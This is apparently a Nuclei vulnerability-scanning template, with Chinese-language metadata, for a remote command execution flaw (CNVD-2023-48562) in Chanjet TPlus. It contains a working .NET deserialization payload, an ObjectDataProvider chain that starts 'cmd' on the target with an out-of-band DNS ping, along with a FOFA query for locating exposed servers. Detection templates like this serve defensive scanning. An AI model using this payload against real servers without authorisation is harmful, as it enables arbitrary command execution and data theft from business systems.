id: CNVD-2023-48562

info:
  name: 畅捷通 TPlus GetStoreWarehouseByStore 远程命令执行漏洞（CNVD-2023-48562）
  author: SleepingBag945
  severity: critical
  description: |
    畅捷通 TPlus 的 AjaxPro 接口在反序列化复杂对象时存在远程命令执行风险。模板调用 `GetStoreWarehouseByStore`，构造 `ObjectDataProvider` 触发系统进程，并通过 DNS 带外回连及异常响应特征确认漏洞。
  impact: |
    - 攻击者可在 TPlus 服务器上执行任意命令，读取财务、库存、客户和业务系统配置。
    - 成功利用后可能部署后门、窃取数据库凭据，并影响企业财务和进销存业务连续性。
  remediation: |
    - 升级畅捷通 TPlus 至厂商修复版本，禁用或修复受影响的 AjaxPro 反序列化入口。
    - 对接口入参做类型白名单校验，禁止反序列化任意 .NET 类型。
    - 排查服务器异常外联、WebShell 和业务账号变更，轮换数据库与应用凭据。
  reference:
    - https://peiqi.wgpsec.org/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20GetStoreWarehouseByStore%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
    - https://github.com/MrWQ/vulnerability-paper/blob/7551f7584bd35039028b1d9473a00201ed18e6b2/bugs/%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  classification:
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="畅捷通-TPlus"
  tags: cnvd,cnvd2023,chanjettplus,rce,oast,vuln

http:
  - raw:
      - |
        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
        Host: {{Hostname}}
        X-Ajaxpro-Method: GetStoreWarehouseByStore

        {
          "storeID":{
            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName":"Start",
            "ObjectInstance":{
            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "StartInfo":{
              "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
              "FileName":"cmd",
              "Arguments":"/c ping {{interactsh-url}}"
            }
            }
          }
        }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "actorId或archivesId不能为空"
          - "\"Type\":\"System.ArgumentException\""
          - "Object reference not set to an instance of an object"
          - "System.NullReferenceException"
        condition: or

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
